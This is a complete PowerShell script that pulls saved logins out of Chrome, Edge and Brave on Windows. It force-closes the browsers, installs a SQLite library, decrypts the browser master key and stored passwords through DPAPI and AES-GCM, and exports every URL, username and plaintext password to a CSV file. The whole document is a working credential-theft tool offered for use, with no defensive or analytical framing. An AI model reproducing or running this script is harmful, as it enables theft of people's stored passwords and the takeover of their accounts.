# Simple Browser Password Extraction Script
# Extracts passwords from Chrome, Edge, and Brave in plaintext
# Automatically downloads System.Data.SQLite, closes browsers, and runs without interaction
# Requires PowerShell 7+ and admin privileges for best results
# Outputs to DecryptedPasswords.csv

param(
    [string]$CSVPath = ".\DecryptedPasswords.csv"
)

# Function to install System.Data.SQLite
function Install-SQLite {
    Write-Host "Installing System.Data.SQLite..." -ForegroundColor Yellow
    try {
        if (-not (Test-Path ".\System.Data.SQLite.dll")) {
            Install-Package -Name System.Data.SQLite -ProviderName NuGet -Scope CurrentUser -Force -ErrorAction Stop
            $sqliteDll = (Get-Package -Name System.Data.SQLite).Source | Split-Path | Join-Path -ChildPath "lib\netstandard2.1\System.Data.SQLite.dll"
            Copy-Item $sqliteDll ".\System.Data.SQLite.dll" -Force
            Write-Host "System.Data.SQLite installed." -ForegroundColor Green
        } else {
            Write-Host "System.Data.SQLite already present." -ForegroundColor Green
        }
        return $true
    } catch {
        Write-Warning "Failed to install System.Data.SQLite: $($_.Exception.Message)"
        return $false
    }
}

# Function to decrypt DPAPI-protected data (older browsers)
function Get-DPAPIDecryptedData {
    param([byte[]]$EncryptedData)
    try {
        Add-Type -AssemblyName System.Security
        $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $EncryptedData, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )
        return [System.Text.Encoding]::UTF8.GetString($decrypted)
    } catch {
        return "[DPAPI Decryption Failed: $($_.Exception.Message)]"
    }
}

# Function to get master key from Local State
function Get-MasterKey {
    param([string]$LocalStatePath)
    try {
        $json = Get-Content $LocalStatePath -Raw | ConvertFrom-Json
        $encryptedKeyBase64 = $json.os_crypt.encrypted_key
        $encryptedKey = [Convert]::FromBase64String($encryptedKeyBase64)
        $encryptedMasterKey = $encryptedKey[5..($encryptedKey.Length - 1)] # Remove "DPAPI"
        $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $encryptedMasterKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )
        return $masterKey
    } catch {
        Write-Warning "Failed to get master key: $($_.Exception.Message)"
        return $null
    }
}

# Function to decrypt AES-GCM passwords (v80+)
function Get-AESGCMDecryptedPassword {
    param(
        [byte[]]$EncryptedData,
        [byte[]]$MasterKey
    )
    try {
        if ($EncryptedData.Length -lt 3 -or 
            [System.Text.Encoding]::ASCII.GetString($EncryptedData[0..2]) -ne "v10") {
            return Get-DPAPIDecryptedData $EncryptedData
        }
        $iv = $EncryptedData[3..14]
        $ciphertextLength = $EncryptedData.Length - 3 - 12 - 16
        $ciphertext = $EncryptedData[15..(15 + $ciphertextLength - 1)]
        $tag = $EncryptedData[($EncryptedData.Length - 16)..($EncryptedData.Length - 1)]
        $plaintext = New-Object byte[] $ciphertextLength
        $aesGcm = New-Object System.Security.Cryptography.AesGcm $MasterKey
        $aesGcm.Decrypt($iv, $ciphertext, $tag, $plaintext, $null)
        $aesGcm.Dispose()
        return [System.Text.Encoding]::UTF8.GetString($plaintext).TrimEnd([char]0)
    } catch {
        return "[AES-GCM Decryption Failed: $($_.Exception.Message)]"
    }
}

# Function to extract passwords from a browser
function Get-BrowserPasswords {
    param(
        [string]$BrowserName,
        [string]$DataPath
    )
    Write-Host "Processing $BrowserName..." -ForegroundColor Yellow
    
    $loginDataPath = Join-Path $DataPath "Default\Login Data"
    $localStatePath = Join-Path $DataPath "Local State"
    
    if (-not (Test-Path $loginDataPath)) {
        Write-Host "$BrowserName login database not found at $loginDataPath" -ForegroundColor DarkGray
        return @()
    }
    
    $masterKey = Get-MasterKey -LocalStatePath $localStatePath
    $results = @()
    
    try {
        Add-Type -Path ".\System.Data.SQLite.dll"
        $conn = New-Object -TypeName System.Data.SQLite.SQLiteConnection
        $conn.ConnectionString = "Data Source=$loginDataPath"
        $conn.Open()
        
        $query = "SELECT origin_url, username_value, password_value FROM logins"
        $cmd = New-Object -TypeName System.Data.SQLite.SQLiteCommand($query, $conn)
        $reader = $cmd.ExecuteReader()
        
        while ($reader.Read()) {
            $url = $reader.GetString(0)
            $username = if ($reader.IsDBNull(1)) { "" } else { $reader.GetString(1) }
            $passwordBytes = if ($reader.IsDBNull(2)) { $null } else { $reader.GetValue(2) -as [byte[]] }
            
            $decryptedPassword = ""
            if ($passwordBytes -and $passwordBytes.Length -gt 0) {
                if ($masterKey) {
                    $decryptedPassword = Get-AESGCMDecryptedPassword -EncryptedData $passwordBytes -MasterKey $masterKey
                } else {
                    $decryptedPassword = Get-DPAPIDecryptedData $passwordBytes
                }
            } else {
                $decryptedPassword = "[No Password]"
            }
            
            $results += [PSCustomObject]@{
                Browser = $BrowserName
                URL = $url
                Username = $username
                Password = $decryptedPassword
                ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            }
        }
        
        $reader.Close()
        $conn.Close()
    } catch {
        Write-Warning "Error processing $BrowserName: $($_.Exception.Message)"
    }
    
    return $results
}

# Main execution
Write-Host "Simple Browser Password Extraction Tool" -ForegroundColor Green
Write-Host "=====================================`n" -ForegroundColor Green

# Check PowerShell version
if ($PSVersionTable.PSVersion.Major -lt 7) {
    Write-Host "This script requires PowerShell 7 or later. Run with 'pwsh.exe'." -ForegroundColor Red
    exit 1
}

# Close browser processes
Write-Host "Closing browser processes..." -ForegroundColor Yellow
$browserProcesses = @("chrome", "msedge", "brave")
foreach ($proc in $browserProcesses) {
    try {
        Get-Process -Name $proc -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 500
    } catch {
        Write-Warning "Could not stop $proc: $($_.Exception.Message)"
    }
}

# Install SQLite
if (-not (Install-SQLite)) {
    Write-Host "Failed to install System.Data.SQLite. Exiting." -ForegroundColor Red
    exit 1
}

# Define browser paths
$browsers = @(
    @{Name = "Google Chrome"; DataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data"},
    @{Name = "Microsoft Edge"; DataPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"},
    @{Name = "Brave Browser"; DataPath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"}
)

$allPasswords = @()

foreach ($browser in $browsers) {
    if (Test-Path $browser.DataPath) {
        $passwords = Get-BrowserPasswords -BrowserName $browser.Name -DataPath $browser.DataPath
        $allPasswords += $passwords
    } else {
        Write-Host "$($browser.Name) not found at $($browser.DataPath)" -ForegroundColor DarkGray
    }
}

# Display and export results
if ($allPasswords.Count -gt 0) {
    Write-Host "`nProcessed $($allPasswords.Count) password entries:`n" -ForegroundColor Green
    $allPasswords | Select-Object -First 10 | Format-Table -Property Browser, URL, Username, Password -AutoSize
    
    try {
        $allPasswords | Export-Csv -Path $CSVPath -NoTypeInformation
        Write-Host "`nPasswords exported to: $CSVPath" -ForegroundColor Green
    } catch {
        Write-Warning "Failed to export to CSV: $($_.Exception.Message)"
    }
    
    $browserStats = $allPasswords | Group-Object Browser | ForEach-Object {
        [PSCustomObject]@{
            Browser = $_.Name
            Passwords = $_.Count
        }
    }
    
    Write-Host "`nPassword Summary by Browser:" -ForegroundColor Cyan
    $browserStats | Format-Table -AutoSize
} else {
    Write-Host "`nNo passwords found or processed." -ForegroundColor Yellow
}

# Cleanup instructions
Write-Host "`nNotes:" -ForegroundColor Cyan
Write-Host "1. System.Data.SQLite.dll remains in the current directory." -ForegroundColor Cyan
Write-Host "2. Delete it to save space when done." -ForegroundColor Cyan
Write-Host "3. Run as admin for best results." -ForegroundColor Cyan
Write-Host "4. Ensure PowerShell 7+ is used (pwsh.exe)." -ForegroundColor Cyan
